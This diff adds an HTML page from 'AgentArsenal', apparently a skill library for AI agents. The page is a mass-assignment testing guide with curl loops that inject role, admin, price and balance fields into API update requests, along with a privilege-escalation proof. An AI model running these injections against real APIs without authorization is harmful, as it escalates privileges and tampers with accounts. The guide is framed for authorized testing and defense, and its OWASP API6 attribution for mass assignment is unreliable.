@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: mass-assignment</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>mass-assignment</h2><div class="meta"><span class="badge gray">api</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when testing whether an API lets clients set fields they</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="api-security-testing.html">api-security-testing</a></div><div class="deps"><span class="kind">requires:</span> <a href="api-security-testing.html">api-security-testing</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="auth-attacks.html">auth-attacks</a> <a href="secure-coding.html">secure-coding</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>curl</td><td>8.5</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>Mass assignment happens when the API binds request fields directly to internal objects without an allow-list: the client sets <code>role=admin</code> or <code>price=0</code> alongside the legitimate fields. This skill covers testing for it on authorized engagements: finding the bindable surface, guessing privileged fields, and proving impact without damaging data. Frameworks make this easy to introduce and hard to notice, which is why it survives code review.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Map update and create endpoints and their documented fields.</li>
+<li>Read responses for field names the docs do not mention (the API</li>
+<p>tells you its object shape).</p>
+<li>Inject candidate privileged fields: role, admin, price, balance,</li>
+<p>status.</p>
+<li>Verify each injection by reading the object back.</li>
+<li>Prove impact with a safe field first, then the real one with care.</li>
+<li>Revert test changes and document the exact bindable fields.</li>
+</ol>
+<h2>1. Discovering the bindable surface</h2>
+<pre><code class="language-bash"># The API&#x27;s own responses reveal its object shape
+curl -s &#x27;https://target.example/api/users/me&#x27; \
+  -H &#x27;Authorization: Bearer TOKEN&#x27; | python3 -m json.tool | head -40
+# Note every field: id, role, is_admin, balance, created_at...
+
+# Compare documented fields (API docs) versus actual fields (responses)
+# Undocumented fields in responses are the first injection candidates
+
+# Guess privileged fields on update endpoints
+for field in role is_admin admin price balance status verified; do
+  echo &quot;== $field&quot;
+  curl -s -X PATCH &#x27;https://target.example/api/users/me&#x27; \
+    -H &#x27;Authorization: Bearer TOKEN&#x27; -H &#x27;Content-Type: application/json&#x27; \
+    -d &quot;{\&quot;nickname\&quot;:\&quot;test\&quot;,\&quot;$field\&quot;:\&quot;injected\&quot;}&quot; \
+    -o /tmp/ma.json -w &#x27;%{http_code}\n&#x27;
+  grep -o &quot;\&quot;$field\&quot;:\&quot;[^\&quot;]*\&quot;&quot; /tmp/ma.json | head -1
+done</code></pre>
+<p>Read the object back after every injection: some APIs echo the injected value without storing it, which is noise; only stored changes are findings.</p>
+<h2>2. Proving impact safely</h2>
+<pre><code class="language-bash"># Safe proof pattern: inject a harmless custom field first
+curl -s -X PATCH &#x27;https://target.example/api/users/me&#x27; \
+  -H &#x27;Authorization: Bearer TOKEN&#x27; -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;nickname&quot;:&quot;test&quot;,&quot;proof_field&quot;:&quot;yes&quot;}&#x27; | grep -o &#x27;&quot;proof_field&quot;:&quot;[^&quot;]*&quot;&#x27;
+# If proof_field persists, binding is open; now try the real fields
+
+# Privilege escalation proof (only with approval, on test accounts)
+curl -s -X PATCH &#x27;https://target.example/api/users/me&#x27; \
+  -H &#x27;Authorization: Bearer TOKEN&#x27; -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;role&quot;:&quot;admin&quot;}&#x27; -o /dev/null -w &#x27;%{http_code}\n&#x27;
+curl -s &#x27;https://target.example/api/users/me&#x27; \
+  -H &#x27;Authorization: Bearer TOKEN&#x27; | grep -o &#x27;&quot;role&quot;:&quot;[^&quot;]*&quot;&#x27;
+
+# Price/balance proof: use the test store, buy the 1-credit item,
+# never touch real money or real inventory</code></pre>
+<p>Revert every change: set the role back, restore the nickname, delete the proof fields. The test account must end the engagement as it started, minus the evidence in your notes.</p>
+<h2>3. Framework-specific notes</h2>
+<pre><code class="language-bash"># The pattern varies by stack, but the test is the same:
+# - Rails: params binding without strong parameters
+# - Spring: @ModelAttribute binding extra fields
+# - Express/Mongoose: Object.assign(req.body, doc)
+# - Django: ModelForm with extra fields, or serializer without read_only
+
+# Nested objects widen the surface: try injecting into sub-objects
+curl -s -X PATCH &#x27;https://target.example/api/users/me&#x27; \
+  -H &#x27;Authorization: Bearer TOKEN&#x27; -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;profile&quot;:{&quot;nickname&quot;:&quot;t&quot;},&quot;role&quot;:&quot;admin&quot;}&#x27; -o /tmp/nested.json -w &#x27;%{http_code}\n&#x27;
+
+# Array and deep-nesting variants for parsers that merge recursively</code></pre>
+<p>When you find one bindable privileged field, test the whole object: frameworks that allow-list nothing usually allow everything, and the report should name every field you confirmed.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The API strips unknown fields. Verify by reading back; stripped is</li>
+<p>the correct behavior, and the test is negative.</p>
+<li>The field binds but has no effect. A <code>role</code> field that stores but is</li>
+<p>never read is a latent issue; note it as defense-in-depth, not as privilege escalation.</p>
+<li>The injection needs admin to matter. Test as the low user; an admin</li>
+<p>setting their own fields is not a finding.</p>
+<li>The API version differs. Test every version in scope; v1 may</li>
+<p>allow-list while v2 binds everything.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Mass assignment confirmed on a critical field: demonstrate the impact</li>
+<p>chain (set role, access admin function) with approval, then revert.</p>
+<li>The whole API binds openly: report the pattern once with the full</li>
+<p>field list, and recommend allow-list binding as the systemic fix.</p>
+<li>You need the developer&#x27;s view: ask for the binding code location to</li>
+<p>cite the exact fix point in the report.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see mass assignment testing as update requests carrying unexpected fields, which good API logging captures. The defense is allow-list binding (only documented fields bind), read-only markers on sensitive fields, and tests that submit extra fields in CI. Frameworks offer the protection; teams must turn it on. Log and alert on requests with undocumented fields as a canary for probing.</p>
+<h2>Key references</h2>
+<ul>
+<li>OWASP API Security Top 10 2023: API6 Unrestricted Access to Sensitive</li>
+<p>Business Flows (mass assignment family).</p>
+<li>CWE-915 (Improperly Controlled Modification of Dynamically-Determined</li>
+<p>Object Attributes).</p>
+<li>CWE-20 (Improper Input Validation).</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
